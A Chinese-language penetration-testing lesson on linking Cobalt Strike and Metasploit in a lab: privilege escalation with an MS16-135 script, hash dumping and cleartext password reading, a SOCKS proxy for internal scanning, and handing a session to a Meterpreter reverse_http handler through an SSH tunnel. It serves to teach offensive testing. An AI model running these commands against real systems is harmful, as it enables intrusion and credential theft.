#  053：Cobalt Strike联动Metasploit 🚀

![](img/644f322a8c39994db2a96129c8f9bb44_1.png)

![](img/644f322a8c39994db2a96129c8f9bb44_3.png)

![](img/644f322a8c39994db2a96129c8f9bb44_5.png)

![](img/644f322a8c39994db2a96129c8f9bb44_7.png)

![](img/644f322a8c39994db2a96129c8f9bb44_9.png)

在本节课中，我们将学习如何将Cobalt Strike与Metasploit这两个强大的渗透测试工具进行联动，以实现更高效的内网渗透和信息收集。课程将涵盖从靶机上线、权限提升到通过代理和端口转发实现工具间协作的完整流程。

![](img/644f322a8c39994db2a96129c8f9bb44_11.png)

---

## 概述

![](img/644f322a8c39994db2a96129c8f9bb44_13.png)

![](img/644f322a8c39994db2a96129c8f9bb44_15.png)

Cobalt Strike更适合作为团队协作和内网管控平台，而Metasploit则拥有丰富的模块用于信息收集和漏洞利用。联动两者可以发挥各自优势。本节课的核心是学习如何配置环境，使Cobalt Strike上线的会话能够转发给内网的Metasploit，并利用SSH隧道解决网络连通性问题。

![](img/644f322a8c39994db2a96129c8f9bb44_17.png)

![](img/644f322a8c39994db2a96129c8f9bb44_19.png)

---

![](img/644f322a8c39994db2a96129c8f9bb44_21.png)

![](img/644f322a8c39994db2a96129c8f9bb44_23.png)

![](img/644f322a8c39994db2a96129c8f9bb44_25.png)

## 第一部分：靶机上线与权限提升

![](img/644f322a8c39994db2a96129c8f9bb44_27.png)

![](img/644f322a8c39994db2a96129c8f9bb44_29.png)

上一节我们介绍了课程的整体目标，本节中我们来看看如何让靶机上线到Cobalt Strike并提升权限。

![](img/644f322a8c39994db2a96129c8f9bb44_31.png)

![](img/644f322a8c39994db2a96129c8f9bb44_33.png)

![](img/644f322a8c39994db2a96129c8f9bb44_35.png)

![](img/644f322a8c39994db2a96129c8f9bb44_37.png)

靶机上线通常通过执行命令或上传Webshell实现。只要命令成功执行且具备相应权限，靶机就能上线。需要注意的是，如果Cobalt Strike服务器在内网，必须确保靶机能够连接到Cobalt Strike服务器。

![](img/644f322a8c39994db2a96129c8f9bb44_39.png)

![](img/644f322a8c39994db2a96129c8f9bb44_41.png)

![](img/644f322a8c39994db2a96129c8f9bb44_43.png)

![](img/644f322a8c39994db2a96129c8f9bb44_45.png)

当靶机上线后，我们获得的是一个普通用户权限的shell。

![](img/644f322a8c39994db2a96129c8f9bb44_47.png)

以下是查看当前用户权限的命令：
```shell
shell whoami
```
执行该命令后，可以看到当前用户是普通用户。

![](img/644f322a8c39994db2a96129c8f9bb44_49.png)

![](img/644f322a8c39994db2a96129c8f9bb44_51.png)

![](img/644f322a8c39994db2a96129c8f9bb44_53.png)

![](img/644f322a8c39994db2a96129c8f9bb44_55.png)

接下来进行权限提升。在Cobalt Strike的`Access`模块中，选择相应的提权脚本（例如MS16-135）。选择后，工具会自动执行攻击脚本。

![](img/644f322a8c39994db2a96129c8f9bb44_56.png)

![](img/644f322a8c39994db2a96129c8f9bb44_58.png)

![](img/644f322a8c39994db2a96129c8f9bb44_60.png)

![](img/644f322a8c39994db2a96129c8f9bb44_62.png)

![](img/644f322a8c39994db2a96129c8f9bb44_64.png)

如果提权成功，会看到第二个会话上线，用户变为`SYSTEM`。此时，我们便获得了该主机的最高权限。

![](img/644f322a8c39994db2a96129c8f9bb44_66.png)

![](img/644f322a8c39994db2a96129c8f9bb44_68.png)

![](img/644f322a8c39994db2a96129c8f9bb44_70.png)

![](img/644f322a8c39994db2a96129c8f9bb44_71.png)

![](img/644f322a8c39994db2a96129c8f9bb44_73.png)

![](img/644f322a8c39994db2a96129c8f9bb44_75.png)

获得最高权限后，可以执行更多操作，例如转储哈希或从内存中读取明文密码。

![](img/644f322a8c39994db2a96129c8f9bb44_77.png)

![](img/644f322a8c39994db2a96129c8f9bb44_79.png)

![](img/644f322a8c39994db2a96129c8f9bb44_81.png)

![](img/644f322a8c39994db2a96129c8f9bb44_83.png)

以下是相关操作命令：
*   **转储哈希**：在会话交互中使用 `hashdump` 命令。
*   **读取明文密码**：使用 `logonpasswords` 命令。

![](img/644f322a8c39994db2a96129c8f9bb44_85.png)

![](img/644f322a8c39994db2a96129c8f9bb44_87.png)

![](img/644f322a8c39994db2a96129c8f9bb44_88.png)

---

![](img/644f322a8c39994db2a96129c8f9bb44_90.png)

![](img/644f322a8c39994db2a96129c8f9bb44_92.png)

![](img/644f322a8c39994db2a96129c8f9bb44_94.png)

![](img/644f322a8c39994db2a96129c8f9bb44_96.png)

![](img/644f322a8c39994db2a96129c8f9bb44_97.png)

![](img/644f322a8c39994db2a96129c8f9bb44_99.png)

## 第二部分：开启SOCKS代理进行内网探测

![](img/644f322a8c39994db2a96129c8f9bb44_101.png)

![](img/644f322a8c39994db2a96129c8f9bb44_103.png)

![](img/644f322a8c39994db2a96129c8f9bb44_105.png)

![](img/644f322a8c39994db2a96129c8f9bb44_107.png)

在获得内网主机控制权后，我们常常需要探测其所在内网的其他资产。由于攻击机可能无法直接访问目标内网，因此需要建立代理。

![](img/644f322a8c39994db2a96129c8f9bb44_109.png)

![](img/644f322a8c39994db2a96129c8f9bb44_111.png)

![](img/644f322a8c39994db2a96129c8f9bb44_113.png)

Cobalt Strike可以方便地开启SOCKS代理。在拥有`SYSTEM`权限的会话中，执行以下命令：
```shell
socks 1234
```
此命令会在Cobalt Strike服务器上开启一个端口为1234的SOCKS4a代理服务。

![](img/644f322a8c39994db2a96129c8f9bb44_115.png)

![](img/644f322a8c39994db2a96129c8f9bb44_116.png)

接下来，我们需要在攻击机（如Kali）上配置代理以使用这个通道。可以使用`proxychains`工具。

![](img/644f322a8c39994db2a96129c8f9bb44_118.png)

![](img/644f322a8c39994db2a96129c8f9bb44_119.png)

![](img/644f322a8c39994db2a96129c8f9bb44_121.png)

![](img/644f322a8c39994db2a96129c8f9bb44_123.png)

以下是配置和使用`proxychains`的步骤：
1.  编辑配置文件：`vi /etc/proxychains.conf`
2.  在文件末尾添加：`socks4 <Cobalt Strike服务器IP> 1234`
3.  在需要代理的命令前加上 `proxychains`，例如：
    ```shell
    proxychains nmap -sT -Pn 192.168.2.135
    ```

![](img/644f322a8c39994db2a96129c8f9bb44_125.png)

![](img/644f322a8c39994db2a96129c8f9bb44_127.png)

需要注意的是，SOCKS代理工作在TCP/IP协议的应用层，因此无法代理ICMP协议（如ping命令）。使用`nmap`扫描时应使用`-sT`（TCP连接扫描）并禁用ping扫描（-Pn）。

![](img/644f322a8c39994db2a96129c8f9bb44_129.png)

![](img/644f322a8c39994db2a96129c8f9bb44_131.png)

![](img/644f322a8c39994db2a96129c8f9bb44_133.png)

通过代理进行扫描和连接速度会较慢，因为流量需要经过多层转发。

![](img/644f322a8c39994db2a96129c8f9bb44_135.png)

---

![](img/644f322a8c39994db2a96129c8f9bb44_137.png)

## 第三部分：将Cobalt Strike会话转发给Metasploit

![](img/644f322a8c39994db2a96129c8f9bb44_139.png)

![](img/644f322a8c39994db2a96129c8f9bb44_141.png)

上一节我们介绍了通过代理访问内网的方法，本节中我们来看看如何将Cobalt Strike上线的会话直接交给功能更丰富的Metasploit来处理。

![](img/644f322a8c39994db2a96129c8f9bb44_143.png)

首先，在Cobalt Strike中创建一个新的监听器（Listener）。
1.  点击 `Listeners` -> `Add`。
2.  设置 `Name`（例如 `msf_listener`）。
3.  选择 `Payload` 为 `windows/foreign/reverse_http`。
4.  设置 `HTTP Host` 为Cobalt Strike服务器的公网IP。
5.  设置 `HTTP Port` 为一个特定端口（例如7777）。

![](img/644f322a8c39994db2a96129c8f9bb44_145.png)

![](img/644f322a8c39994db2a96129c8f9bb44_147.png)

![](img/644f322a8c39994db2a96129c8f9bb44_149.png)

接着，在**内网**的Metasploit中配置接收端。
1.  启动msfconsole。
2.  使用处理器模块：`use exploit/multi/handler`
3.  设置与Cobalt Strike监听器匹配的Payload：
    ```shell
    set payload windows/meterpreter/reverse_http
    ```
4.  设置监听地址和端口（指向**内网Kali本机**的IP和上面定义的端口）：
    ```shell
    set LHOST 192.168.123.128
    set LPORT 7777
    ```
5.  运行监听：`run`

![](img/644f322a8c39994db2a96129c8f9bb44_151.png)

现在，Cobalt Strike服务器（公网）上的7777端口与内网Metasploit的7777端口尚未连通。由于公网无法直接访问内网，我们需要使用SSH隧道进行端口转发。

![](img/644f322a8c39994db2a96129c8f9bb44_153.png)

![](img/644f322a8c39994db2a96129c8f9bb44_155.png)

在**内网Kali**中执行以下SSH隧道命令：
```shell
ssh -C -f -N -g -L 0.0.0.0:7777:127.0.0.1:7777 root@39.108.68.207 -p 22
```
此命令将本地（Kali）的7777端口流量，通过SSH隧道转发到公网服务器（39.108.68.207）的7777端口。执行后需要输入公网服务器的root密码。

![](img/644f322a8c39994db2a96129c8f9bb44_157.png)

![](img/644f322a8c39994db2a96129c8f9bb44_159.png)

![](img/644f322a8c39994db2a96129c8f9bb44_161.png)

![](img/644f322a8c39994db2a96129c8f9bb44_163.png)

隧道建立后，端口即实现连通。最后，在Cobalt Strike中，右键点击要转发的会话（如`SYSTEM`权限的会话），选择 `Spawn`，然后选择刚刚创建的 `msf_listener`。

稍作等待，在Metasploit中即可收到反弹回来的Meterpreter会话。至此，我们成功将Cobalt Strike的会话移交给了Metasploit，可以利用后者更强大的模块进行后续渗透。

![](img/644f322a8c39994db2a96129c8f9bb44_165.png)

---

## 总结

本节课中我们一起学习了Cobalt Strike与Metasploit的联动技术。主要内容包括：
1.  让靶机上线Cobalt Strike并进行权限提升。
2.  通过开启SOCKS代理，利用`proxychains`工具进行内网探测。
3.  核心部分：通过创建外部监听器（Foreign Listener）和配置SSH隧道，解决网络隔离问题，成功将Cobalt Strike的会话转发给内网的Metasploit。

![](img/644f322a8c39994db2a96129c8f9bb44_167.png)

这些技术在实际的内网渗透测试中非常实用，能够有效结合两款工具的优势。请务必亲自动手搭建环境进行实验，以加深理解。